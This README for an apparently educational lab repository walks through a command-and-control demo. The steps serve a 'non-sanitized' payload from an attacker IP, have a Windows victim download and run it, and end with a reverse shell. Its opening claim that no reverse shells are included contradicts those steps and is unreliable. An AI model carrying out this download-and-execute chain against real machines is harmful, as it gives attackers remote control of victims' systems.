# Mini Lab — C2 Workflow (Sanitized)  
>  **Important:**
> This repository contains a **sanitized, harmless demo** only. It does **not** include real payloads, reverse shells, or any code that enables remote compromise. This is for educational purposes only and was tested in an isolated lab environment.
The files `c2_server.py` and `payload.py` must be configured to use localhost only and must not execute arbitrary shell commands. Only publish after following the "Sanitization checklist" below.

---

## Overview
This repository demonstrates a conceptual C2 interaction using two files:

- `c2_server.py` — server (attacker side)  
- `payload.py` — client (victim side)

**This README shows how to run a safe, localhost-only demo and how to sanitize these files before making the repo public.**

---

## Requirements
- Python 3.8+ installed
- Basic terminal/command-line knowledge

---

## Quick safe demo — step by step
1. **Attacker (Kali) Starts Listener:**
The handler is started and waits for an incoming reverse shell connection on the Attacker's internal IP (e.g., 192.168.1.50:4444).
   ```bash
    python3 c2_server.py
   ```

2. **Attacker (Kali) Starts HTTP Server**:
The attacker starts a simple web server in the same directory as the non-sanitized payload.py file to simulate the payload distribution channel.

   ```bash
    python3 -m http.server 8080
   ```


3. **Victim (Windows) Downloads Payload:**
The victim machine opens a browser and accesses the Attacker's IP and port to download the file, completing the Initial Access phase.

   ```bash
    URL: http://[KALI_IP]:8080/payload.py (e.g., http://192.168.1.50:8080/payload.py)
   ```

4. **Victim (Windows) Executes Payload:**
The victim runs the downloaded payload file.
   ```bash
    python payload.py
   ```

5. **C2 Established:**
The handler on the Kali machine receives the connection, and the reverse shell is established, granting command-line control over the Windows victim machine.
